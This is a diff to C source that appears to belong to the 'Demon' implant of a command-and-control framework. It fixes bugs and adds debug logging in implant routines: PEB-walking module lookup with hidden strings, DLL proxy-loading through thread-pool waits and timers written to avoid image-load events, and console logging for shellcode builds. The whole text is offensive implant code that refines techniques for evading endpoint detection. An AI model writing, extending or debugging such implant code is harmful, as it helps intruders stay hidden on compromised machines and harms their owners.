@@ -176,8 +176,8 @@ PVOID LdrModuleSearch(
     Dll[ 2 ] = HideChar( 'L' );
     Dll[ 0 ] = HideChar( '.' );
 
-    Entry      = Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
-    FirstEntry = &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
+    Entry      = (PLDR_DATA_TABLE_ENTRY) Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
+    FirstEntry = (PLDR_DATA_TABLE_ENTRY) &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
 
     StringCopyW( Name, ModuleName );
 
@@ -194,7 +194,7 @@ PVOID LdrModuleSearch(
             MemZero( Name, sizeof( Name ) );
             return Entry->DllBase;
         }
-        Entry = Entry->InLoadOrderLinks.Flink;
+        Entry = (PLDR_DATA_TABLE_ENTRY) Entry->InLoadOrderLinks.Flink;
     } while ( Entry != FirstEntry );
 
     MemZero( Name, sizeof( Name ) );
@@ -221,7 +221,14 @@ PVOID LdrModuleLoad(
     USHORT         DestSize       = 0;
     HANDLE         Event          = NULL;
     HANDLE         Queue          = NULL;
-    HANDLE         Timer          = NULL;
+    /* Wait is the wait-handle returned by RtlRegisterWait.
+     * TimerHdl is the timer-handle returned by RtlCreateTimer.
+     * They MUST stay separate — passing a timer handle to
+     * RtlDeregisterWaitEx (or vice versa) corrupts the thread pool
+     * because the pool dereferences the wrong TP_* object type.
+     * See BUG-LDR-1 in SleepObf-Analysis.md §8. */
+    HANDLE         Wait           = NULL;
+    HANDLE         TimerHdl       = NULL;
     DWORD          Count          = 5;
     NTSTATUS       NtStatus       = STATUS_SUCCESS;
 
@@ -235,11 +242,14 @@ PVOID LdrModuleLoad(
     /* get size of module unicode string */
     DestSize = StringLengthW( NameW ) * sizeof( WCHAR );
 
+    PRINTF( "LdrModuleLoad: ENTRY '%s' ProxyLoading=%d\n", ModuleName, Instance->Config.Implant.ProxyLoading )
+
     /* check if the module is already loaded */
     Module = LdrModuleSearch( NameW );
 
     /* if found, avoid generating an image-load event */
     if ( Module ) {
+        PRINTF( "LdrModuleLoad: '%s' already loaded at %p (LdrModuleSearch hit)\n", ModuleName, Module )
         return Module;
     }
 
@@ -256,8 +266,11 @@ PVOID LdrModuleLoad(
                 goto DEFAULT;
             }
 
-            /* call LoadLibraryW */
-            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Timer, Event, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
+            /* call LoadLibraryW.
+             * WT_EXECUTEONLYONCE auto-deregisters the wait after the
+             * callback completes — no explicit RtlDeregisterWaitEx needed.
+             * See HVC-011 in CHANGES.md. */
+            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Wait, Event, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
                 PRINTF( "RtlRegisterWait: %p\n", NtStatus )
                 goto DEFAULT;
             }
@@ -274,8 +287,12 @@ PVOID LdrModuleLoad(
                 goto DEFAULT;
             }
 
-            /* call LoadLibraryW */
-            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
+            /* call LoadLibraryW.
+             * TimerHdl is owned by Queue — it is reaped automatically by
+             * RtlDeleteTimerQueueEx(Queue, INVALID_HANDLE_VALUE) at END:.
+             * Never call RtlDeregisterWaitEx on it.
+             * See BUG-LDR-1 in SleepObf-Analysis.md §8. */
+            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &TimerHdl, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
                 PRINTF( "RtlCreateTimer: %p\n", NtStatus )
                 goto DEFAULT;
             }
@@ -302,6 +319,7 @@ PVOID LdrModuleLoad(
             /* after 5 times checking give up.
              * use LdrLoadDll instead */
             if ( ! Count ) {
+                PUTS( "LdrModuleLoad: PEB poll exhausted (5 retries), falling back" )
                 break;
             }
 
@@ -310,8 +328,11 @@ PVOID LdrModuleLoad(
              * NOTE: we are getting the module by string because there are some hash collisions
              *       when using LdrModulePeb */
             if ( ( Module = LdrModulePebByString( NameW ) ) ) {
+                PRINTF( "LdrModuleLoad: PEB poll hit after %lu retries, Module=%p\n", (unsigned long)( 5 - Count ), Module )
                 break;
             }
+
+            PRINTF( "LdrModuleLoad: PEB poll miss (Count=%lu remaining), sleeping 100ms\n", (unsigned long) Count )
 
             /* a little delay between each PEB check */
             SharedSleep( 100 );
@@ -353,16 +374,20 @@ END:
 
     PRINTF( "Module \"%s\": %p\n", ModuleName, Module )
 
-    /* close event end */
+    /* close event */
     if ( Event ) {
         SysNtClose( Event );
         Event = NULL;
     }
 
-    /* close queue */
+    /* Non-blocking queue cleanup.
+     * TimerHdl is implicitly reaped by queue destruction.
+     * Wait handle (RtlRegisterWait path) is auto-deregistered by
+     * WT_EXECUTEONLYONCE — no explicit deregister needed. */
     if ( Queue ) {
         Instance->Win32.RtlDeleteTimerQueue( Queue );
         Queue = NULL;
+        TimerHdl = NULL;
     }
 
     return Module;
@@ -1286,6 +1311,7 @@ VOID CfgAddressAdd(
     }
 }
 
+#ifdef SLEEPOBF_USE_TIMER
 /*!
  * Sets an event
  * @param Event
@@ -1295,6 +1321,7 @@ BOOL EventSet(
 ) {
     return NT_SUCCESS( Instance->Win32.NtSetEvent( Event, NULL ) );
 }
+#endif
 
 
 /*!
@@ -1429,48 +1456,68 @@ VOID DemonPrintf( PCHAR fmt, ... )
     Instance->Win32.LocalFree( CallbackOutput );
 }
 
-#elif defined(SHELLCODE) && defined(DEBUG)
+#elif (defined(SHELLCODE) || defined(DEBUG_NOSTDLIB)) && defined(DEBUG)
 
+/* [DEBUG-STRINGS-ONLY 2026-04-28]
+ * LogToConsole writes a formatted line to STD_OUTPUT_HANDLE without using
+ * libc. With --debug-strings-only the demon EXE is built as a CONSOLE
+ * subsystem app (-mconsole + -e WinMain in builder.go), so cmd.exe
+ * automatically hooks our stdout to its window — GetStdHandle returns the
+ * console handle directly, no AttachConsole needed.
+ *
+ * Implementation notes:
+ *   - Uses a 2 KB stack buffer to avoid LocalAlloc on every log line.
+ *   - Calls vsnprintf ONCE (the previous code called it twice with the same
+ *     va_list, which is undefined behaviour on x64 mingw — likely cause of
+ *     the "crashes instantly" symptom users reported).
+ *   - Checks both NULL and INVALID_HANDLE_VALUE on the std handle.
+ *   - For SHELLCODE builds (where the host process may be GUI subsystem and
+ *     stdout is not connected), AttachConsole(ATTACH_PARENT_PROCESS) is
+ *     called once to hook the parent's console. For DEBUG_NOSTDLIB EXE
+ *     builds it's harmless: the call just returns FALSE since the console
+ *     is already attached. */
 VOID LogToConsole(
     IN LPCSTR fmt,
     ...)
 {
-    INT     OutputSize   = 0;
-    LPSTR   OutputString = NULL;
-    va_list VaListArg    = 0;
+    CHAR    Buf[ 2048 ];
+    va_list args;
+    INT     Len = 0;
 
-    // have we initialized all the function addresses?
-    if ( Instance->Win32.AttachConsole == NULL ||
-         Instance->Win32.vsnprintf     == NULL ||
-         Instance->Win32.GetStdHandle  == NULL ||
-         Instance->Win32.WriteConsoleA == NULL ||
-         Instance->Win32.LocalAlloc    == NULL )
+    /* CRITICAL: Instance itself may be NULL when LogToConsole is called from
+     * WinMain — the PRINTF on the very first line of WinMain runs BEFORE
+     * DemonMain has set `Instance = &Inst`. Without this guard, dereferencing
+     * Instance->... causes an instant access violation. Production builds
+     * don't hit this because PRINTF expands to a no-op, but --debug-dev does. */
+    if ( Instance == NULL )
         return;
 
-    // get the handle to the output console
-    if ( Instance->hConsoleOutput == NULL )
+    /* Required Win32 fn pointers — drop silently if not yet resolved. */
+    if ( Instance->Win32.vsnprintf     == NULL ||
+         Instance->Win32.GetStdHandle  == NULL ||
+         Instance->Win32.WriteConsoleA == NULL )
+        return;
+
+    if ( Instance->hConsoleOutput == NULL ||
+         Instance->hConsoleOutput == INVALID_HANDLE_VALUE )
     {
-        Instance->Win32.AttachConsole( ATTACH_PARENT_PROCESS );
+        if ( Instance->Win32.AttachConsole != NULL ) {
+            Instance->Win32.AttachConsole( ATTACH_PARENT_PROCESS );
+        }
         Instance->hConsoleOutput = Instance->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
-        if ( ! Instance->hConsoleOutput  )
+        if ( Instance->hConsoleOutput == NULL ||
+             Instance->hConsoleOutput == INVALID_HANDLE_VALUE )
             return;
     }
 
-    va_start( VaListArg, fmt );
+    va_start( args, fmt );
+    Len = Instance->Win32.vsnprintf( Buf, sizeof( Buf ), fmt, args );
+    va_end( args );
 
-    // allocate space for the final string
-    OutputSize   = Instance->Win32.vsnprintf( NULL, 0, fmt, VaListArg ) + 1;
-    OutputString = Instance->Win32.LocalAlloc( LPTR, OutputSize );
+    if ( Len <= 0 ) return;
+    if ( Len > (INT) sizeof( Buf ) ) Len = sizeof( Buf );
 
-    // write the final string
-    Instance->Win32.vsnprintf( OutputString, OutputSize, fmt, VaListArg );
-
-    // write it to the console
-    Instance->Win32.WriteConsoleA( Instance->hConsoleOutput, OutputString, OutputSize, NULL, NULL );
-
-    DATA_FREE( OutputString, OutputSize );
-
-    va_end( VaListArg );
+    Instance->Win32.WriteConsoleA( Instance->hConsoleOutput, Buf, (DWORD) Len, NULL, NULL );
 }
 
 #endif
@@ -1500,7 +1547,7 @@ PROOT_DIR listDir(
     PSUB_DIR         SubDir        = NULL;
     BOOL             IsDir         = FALSE;
     LPWSTR           Path          = NULL;
-    UINT32           PathSize      = NULL;
+    UINT32           PathSize      = 0;
     BOOL             Success       = FALSE;
 
     if ( ( ! StartPath ) || ( FilesOnly && DirsOnly ) ) {
